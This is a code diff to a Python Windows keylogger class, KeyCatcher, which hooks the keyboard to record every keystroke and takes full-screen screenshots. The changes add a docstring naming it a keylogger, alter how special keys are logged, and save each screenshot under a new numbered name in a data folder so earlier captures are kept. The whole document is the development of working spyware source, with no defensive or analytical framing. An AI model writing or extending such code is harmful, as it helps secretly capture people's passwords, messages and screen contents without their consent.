@@ -14,6 +14,9 @@ CURRENT_PATH = os.path.dirname(os.path.realpath(__file__))
 
 
 class KeyCatcher:
+    """
+    manage the keylogger's actions
+    """
     def __init__(self, data_path=CURRENT_PATH):
         self.data_info = DataInfo.DataInfo(data_path, "log", "screenshot", "self")
         self.data = ""
@@ -26,7 +29,6 @@ class KeyCatcher:
         self.hm.KeyDown = self.key_press
         # set the hook
         self.hm.HookKeyboard()
-
 
     def key_press(self, event):
         print 'MessageName:', event.MessageName
@@ -44,7 +46,7 @@ class KeyCatcher:
         print 'Transition', event.Transition
         print '---'
         # catch special keys (such as ctrl, back...)
-        if event.Ascii == 0:
+        if not 33 < event.Ascii < 126:
             self.data += "(-%s-)" % event.Key
         else:
             self.data += event.Key
@@ -61,5 +63,7 @@ class KeyCatcher:
         user32 = windll.user32
         user32.SetProcessDPIAware()
         screen_shot = pyautogui.grab(region=(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT))
-        save_path = "MySnapshot.jpg"
-        screen_shot.save(save_path)
+        save_path = self.data_info.get_type_path("screenshot")
+        # create a non existing name
+        i = 1 + len(os.listdir(save_path))
+        screen_shot.save(save_path + "\\screenshot%i.jpg" % i)
